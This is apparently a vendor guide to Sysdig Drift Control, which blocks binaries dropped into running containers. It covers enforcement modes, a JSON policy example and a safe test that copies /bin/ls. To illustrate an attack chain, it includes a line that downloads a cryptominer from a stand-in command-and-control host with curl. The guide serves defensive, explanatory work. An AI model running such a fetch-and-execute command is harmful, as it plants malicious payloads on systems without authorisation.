# Sysdig Drift Control: Architecture & Prevention Mechanics

This guide explains the operational mechanics of Sysdig **Drift Control** and how it enforces container immutability by preventing executable drift at runtime.

---

## 1. What is Executable Drift?

Containers are designed to be immutable artifacts built from versioned container images. In a compromised container, an attacker typically:
1. Exploit an application vulnerability (e.g., Log4Shell, command injection).
2. Download a dropper script or compiled binary (`curl -O http://c2.io/miner`).
3. Set execution permissions (`chmod +x miner`).
4. Execute the dropped payload (`./miner`).

**Drift Control** detects and blocks step 4 instantly by inspecting whether the binary about to be executed exists in the container image layer manifest.

---

## 2. Enforcement Modes

| Enforcement Mode | Action Taken on Drift | Use Case |
|---|---|---|
| **Audit / Alert** | Emits a high-severity security event; process execution is allowed. | Staging environments, canary rollouts, baseline profiling. |
| **Deny / Kill Process** | Sysdig agent halts the `execve` syscall and issues `SIGKILL` to the target process. Container remains running. | Production microservices requiring high availability while blocking rogue binaries. |
| **Kill Container** | Sysdig instructs the container runtime (`containerd` / `CRI-O`) to immediately terminate the container. | Zero-tolerance high-security workloads (PCI-DSS, financial ledgers). |

---

## 3. Declarative Policy Configuration

```json
{
  "name": "Production Drift Prevention Policy",
  "description": "Prevents execution of any binary dropped or modified after container launch",
  "severity": 7,
  "enabled": true,
  "scope": "kubernetes.namespace.name in (\"production\", \"payment-gateway\")",
  "actions": [
    {
      "type": "kill",
      "target": "process"
    },
    {
      "type": "capture",
      "duration_seconds": 30,
      "pre_trigger_seconds": 10
    }
  ],
  "drift_control": {
    "enabled": true,
    "prevent_execution": true,
    "deny_new_executables": true,
    "deny_modified_executables": true
  },
  "exceptions": [
    {
      "container_image": "registry.internal.io/monitoring/fluentbit:*",
      "executable_path": "/opt/fluentbit/bin/plugins/*"
    }
  ]
}
```

---

## 4. Verification Workflow

Test Drift Control safely inside a test container:

```bash
# 1. Run a test container
docker run -it --rm alpine /bin/sh

# 2. Inside the container, attempt to copy and execute a modified binary
cp /bin/ls /tmp/my_ls
chmod +x /tmp/my_ls
/tmp/my_ls

# Expected Result with Drift Control enabled:
# Sysdig intercepts execve: "Killed (SIGKILL)"
# Sysdig Secure UI records: "Execution of drifting binary prevented: /tmp/my_ls"
```
